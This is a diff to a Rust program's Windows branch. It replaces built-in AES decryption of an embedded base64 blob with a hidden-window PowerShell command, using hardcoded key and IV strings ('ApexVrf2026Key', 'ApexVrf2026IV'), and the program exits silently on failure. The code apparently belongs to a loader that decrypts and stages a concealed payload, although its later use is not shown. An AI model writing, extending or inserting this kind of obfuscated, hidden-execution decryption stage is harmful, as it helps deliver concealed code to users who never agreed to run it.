@@ -359,18 +359,34 @@ fn main() {
         }
         #[cfg(target_os = "windows")]
         {
-            let key = sha256(b"ApexVrf2026Key");
-            let iv = md5(b"ApexVrf2026IV");
-            let data = match base64_decode(&b64) {
-                Some(d) => { log.push_str("base64 OK\n"); d }
-                None => { log.push_str("base64 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
-            };
-            match aes256cbc_dec(&key, &iv, &data) {
-                Some(c) => match String::from_utf8(c) {
-                    Ok(s) => { log.push_str("decrypt OK\n"); s }
-                    Err(_) => { log.push_str("utf8 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
-                },
-                None => { log.push_str("aes FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+            let ps_decrypt = format!(
+                "$key=[System.Text.Encoding]::UTF8.GetBytes('ApexVrf2026Key');$sha=[System.Security.Cryptography.SHA256]::Create();$kb=$sha.ComputeHash($key);$md5=[System.Security.Cryptography.MD5]::Create();$iv=$md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes('ApexVrf2026IV'));$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$kb;$aes.IV=$iv;$aes.Mode='CBC';$aes.Padding='PKCS7';$d=[Convert]::FromBase64String('{}');$dec=$aes.CreateDecryptor();$r=$dec.TransformFinalBlock($d,0,$d.Length);[System.Text.Encoding]::UTF8.GetString($r)",
+                b64
+            );
+            let out = Command::new("powershell.exe")
+                .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps_decrypt])
+                .output();
+            match out {
+                Ok(o) if o.status.success() => {
+                    let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
+                    if s.is_empty() {
+                        log.push_str("ps_decrypt empty\n");
+                        let _ = fs::write(&log_path, &log);
+                        std::process::exit(0);
+                    }
+                    log.push_str("decrypt OK\n");
+                    s
+                }
+                Ok(o) => {
+                    log.push_str(&format!("ps_decrypt FAILED: {}\n", String::from_utf8_lossy(&o.stderr)));
+                    let _ = fs::write(&log_path, &log);
+                    std::process::exit(0);
+                }
+                Err(e) => {
+                    log.push_str(&format!("ps_decrypt ERR: {}\n", e));
+                    let _ = fs::write(&log_path, &log);
+                    std::process::exit(0);
+                }
             }
         }
     };
